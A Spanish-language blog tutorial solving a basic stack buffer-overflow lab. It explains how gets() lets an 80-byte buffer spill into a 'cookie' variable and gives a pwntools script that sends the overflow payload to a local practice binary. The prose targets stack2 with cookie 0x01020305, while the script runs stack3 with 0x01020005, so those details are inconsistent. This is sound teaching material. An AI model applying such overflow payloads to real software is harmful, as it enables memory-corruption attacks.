# Buffer-Overflow Básico

[stack2.c](/assets/images/Buffer-Overflow-basico/stack2.c)

Analizamos el código en c:

![Untitled](/assets/images/Buffer-Overflow-basico/Untitled.png)

Podemos ver que tiene declarado un buffer de 80 caracteres, luego printea por pantalla el valor de buf y de cookie, para luego usar la función gets (la cual se considera insegura y no debería de usarse) para llamar a buf.

Un atacante podría aprovecharse de esta función “gets” para ocasionar un desbordamiento del buffer de la siguiente manera.

Leyendo el código sabemos que si introducimos un total de 80 caracteres ya estamos sobrepasando el el valor que puede almacenar “buf”, por lo que los siguientes caracteres estarán sobre escribiendo el flujo del programa, en el código se realiza una comparacion del valor de “cookie”, si cookie es igual a 0x01020305 va a printear por pantalla “you win”. 

Ese es el objetivo del ejercicio, se podría realizar de la siguiente forma:

![Untitled](/assets/images/Buffer-Overflow-basico/Untitled%201.png)

Con python printeamos “A” 80 veces (tamaño del buffer declarado) y luego le sumamos en little-endian el valor que tiene que valer cookie para que se cumpla el condicional (\x05\x03\x02\x01), de esta forma realizamos un desbordamiento del buffer y conseguimos que el flujo del programa vaya por donde queramos.

Para este ejercicio he creado un exploit que realiza el buffer overflow automáticamente.

```python
#!/usr/bin/python3

from subprocess import *
from pwn import *
from struct import pack

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	try:
		buf = 80
		buffer = b"A"*buf
		cookie = pack("<I", 0x01020005)
		print(cookie)
		payload = buffer+cookie
		print(payload)
		p = process('./stack3')
#		context.log_level = 'DEBUG'
		p.sendline(payload)
		print(p.recvline())
		print(p.recvline())
	except Exception as e:
		print(e)
```

![Untitled](/assets/images/Buffer-Overflow-basico/Untitled%202.png)